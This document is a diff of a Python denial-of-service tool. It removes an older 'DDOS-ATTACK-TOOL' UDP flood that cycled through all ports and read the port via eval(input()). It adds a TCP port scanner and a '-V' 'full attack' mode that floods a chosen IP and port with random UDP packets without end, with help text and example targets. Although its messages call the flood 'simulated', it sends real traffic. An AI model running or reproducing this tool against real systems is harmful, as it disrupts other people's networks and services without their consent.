@@ -1,55 +1,123 @@
 import os
 import time
 import socket
-import scapy.all as scapy
 import random
+import sys
 
-# DDOS-Attack [ASCII Art]
-
-
+# Funktion zur Anzeige des Banners
 def display_banner():
-    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
-    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
-    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
-    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
-    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
-    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
-    print(banner)
+    print("""
+                           ___________.__                    .___
+  ____   ____  ____   ____ \\_   _____/|  |   ____   ____   __| _/
+ /    \\_/ __ \\/  _ \\/    \\ |    __)  |  |  /  _ \\ /  _ \\ / __ | 
+|   |  \\  ___(  <_> )   |  \\|     \\   |  |_(  <_> |  <_> ) /_/ | 
+|___|  /\\___  >____/|___|  /\\___  /   |____/\\____/ \\____/\\____ | 
+     \\/     \\/           \\/     \\/                            \\/ 
+    """)
 
+# Funktion zur Anzeige der Hilfe
+def display_help():
+    print("""
+Usage:
+    python script.py -P <Target IP>          : Perform a port scan on the specified IP address.
+    python script.py -V <Target IP> <Port>   : Perform a full attack on the specified IP and port.
+    python script.py -h                      : Show this help message.
 
-display_banner()
+Options:
+    -P <Target IP>       : Scan ports 1-1024 on the given IP address.
+    -V <Target IP> <Port> : Perform a flood attack on the specified port of the target IP.
+    -h                   : Display this help message.
 
-# Terminal header settings and information
-os.system('color 0A')
-print("Developer  :   Peyman Kinz")
-print("Created Date:   2023-16-6")
+Example:
+    python script.py -P 192.168.1.1
+    python script.py -V 192.168.1.1 80
+""")
 
-# Date and Time Declaration and Initialization
-mydate = time.strftime('%Y-%m-%d')
-mytime = time.strftime('%H-%M')
+# Port-Scan-Funktion
+def port_scan(target_ip):
+    print(f"Starting port scan on {target_ip}...\n")
+    open_ports = []
+    closed_ports = []
+    
+    # Scanne Ports von 1 bis 1024 (anpassbar)
+    for port in range(1, 1025):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((target_ip, port))
+            if result == 0:
+                open_ports.append(port)
+            else:
+                closed_ports.append(port)
+            sock.close()
+        except socket.error:
+            closed_ports.append(port)  # Wenn der Port nicht erreichbar ist, wird er als geschlossen markiert.
 
-# Lets define sock and bytes for our attack
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+    # Ausgabe der offenen und geschlossenen Ports nebeneinander
+    print("Open Ports                | Closed Ports")
+    print("-----------------------------------------")
+    
+    # Berechne die maximale Anzahl von Ports für das Layout
+    max_ports = max(len(open_ports), len(closed_ports))
+    for i in range(max_ports):
+        open_port = open_ports[i] if i < len(open_ports) else ""
+        closed_port = closed_ports[i] if i < len(closed_ports) else ""
+        print(f"{str(open_port).ljust(20)}| {str(closed_port).ljust(20)}")
 
-# Type your ip and port number (find IP address using nslookup or any online website)
-ip = input("IP Target : ")
-port = eval(input("Port       : "))
+    print("\nPort scan complete.")
 
-# Lets start the attack
-print("Thank you for using the Peyman Kinz (DDOS-ATTACK-TOOL).")
-print("Starting the attack on ", ip, " at port ", port, "...")
+# Vollständiger Angriff und Testmodus
+def complete_attack(target_ip, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = random._urandom(1024)  # Verwende kleinere Pakete, um die Last zu reduzieren.
+    print(f"Starting simulated packet flood to {target_ip} on port {port}...")
+    sent = 0
+    try:
+        while True:
+            sock.sendto(data, (target_ip, port))
+            sent += 1
+            print(f"Sent {sent} packets to {target_ip}:{port}")
+            time.sleep(0.01)  # Verzögerung, um Netzwerke nicht zu überlasten.
+    except KeyboardInterrupt:
+        print("\nAttack stopped by user.")
+    except Exception as e:
+        print(f"Error occurred: {e}")
+    finally:
+        sock.close()
+        print("\nProgram terminated.")
 
-time.sleep(5)
-sent = 0
-while True:
-    sock.sendto(bytes, (ip, port))
-    sent = sent + 1
-    port = port + 1
-    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
-    if port == 65534:
-        port = 1
-        
-# End of the script
-os.system("cls")
-input("Press Enter to exit...")
+# Hauptfunktion
+def main():
+    # Terminal Setup
+    os.system("color 0A")
+    display_banner()
+
+    # Überprüfe die Argumente
+    if len(sys.argv) < 2:
+        display_help()
+        return
+
+    if sys.argv[1] == "-h":  # Hilfe anzeigen
+        display_help()
+        return
+
+    if sys.argv[1] == "-P":  # Nur Port-Scan durchführen
+        if len(sys.argv) < 3:
+            print("Usage: python script.py -P <Target IP>")
+            return
+        target_ip = sys.argv[2]
+        port_scan(target_ip)
+
+    elif sys.argv[1] == "-V":  # Vollständigen Angriff durchführen
+        if len(sys.argv) < 4:
+            print("Usage: python script.py -V <Target IP> <Port>")
+            return
+        target_ip = sys.argv[2]
+        port = int(sys.argv[3])
+        complete_attack(target_ip, port)
+
+    else:
+        print("Invalid argument. Use -P for Port Scan, -V for Full Attack, or -h for Help.")
+
+if __name__ == "__main__":
+    main()
